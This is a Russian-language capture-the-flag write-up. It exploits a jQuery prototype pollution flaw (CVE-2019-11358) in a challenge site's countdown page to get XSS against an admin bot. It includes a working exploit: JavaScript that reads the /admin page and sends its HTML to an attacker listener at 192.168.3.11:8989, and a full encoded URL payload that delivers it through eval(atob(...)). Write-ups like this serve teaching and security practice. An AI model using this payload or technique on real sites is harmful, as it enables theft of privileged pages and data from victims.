При осмотре сайта можно обнаружить /admin путь. Без админской сессии сайт редиректит в корень. Можно предположить, что необходимо захватить админа. Также есть форма обратной связи. При передаче ссылки админ переходит по ней. Значит нужно искать client-side уязвимость. На сайте не много функционала. Можно заметить GET параметр в /countdown.html. При детальном анализе JS кода можно обнаружить небезопасное объединение объектов, что приводит к Prototype pollution (PP) ([CVE-2019-11358](https://hackerone.com/reports/454365)):

`$.extend(true, countdown_data, params);`

Код берет GET параметры и приводит их в JSON, а затем передает в extend.

`var params = JSON.parse('{"' + decodeURI(search).replace(/&/g, '","').replace(/=/g,'":"') + '"}');`

Если установить decrease_time=1, то путевки сразу закончатся, а скрипт небезопасно выведет last_package в тело DOM. Через PP можно переписать last_package в прототипе.

Необходимо составить payload таким образом, чтобы код корректно конвертировал GET параметры в JSON. Это усложняет эксплуатацию, т.к. некоторые символы использовать нельзя. Один из возможных способов - использовать dummy параметры вокруг payload, а сам внедряемый js обернуть в `eval(atob(...))`. В base64 не должно быть символов '=' в конце.

Эксплойт приведен ниже. Таск находится на http://192.168.3.11:8088 . Атакующий слушает на http://192.168.3.11:8989/
Украсть куку не получится из-за флага HttpOnly. Необходимо украсть окружение - страницу /admin и отправить себе html с флагом.

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/admin", false);
xhr.onload = function() {
	if (xhr.status === 200)
		document.location="http://192.168.3.11:8989/"+encodeURI(xhr.responseText);
    else alert("Error: " + xhr.status);
};
xhr.send();
```

`http://192.168.3.11:8088/countdown.html?t=1&decrease_time=1&z=z%22,%22__proto__%22:%7B%22started%22:1,%22last_package%22:%22%3Cscript%3Eeval(atob(%27dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiR0VUIiwgIi9hZG1pbiIsIGZhbHNlKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewoJaWYgKHhoci5zdGF0dXMgPT09IDIwMCkKCQlkb2N1bWVudC5sb2NhdGlvbj0iaHR0cDovLzE5Mi4xNjguMy4xMTo4OTg5LyIrZW5jb2RlVVJJKHhoci5yZXNwb25zZVRleHQpOwogICAgZWxzZSBhbGVydCgiRXJyb3I6ICIgKyB4aHIuc3RhdHVzKTsKfTsKeGhyLnNlbmQoKTsg%27))%3C/script%3E%22%7D,%22z%22:%22z%7D`

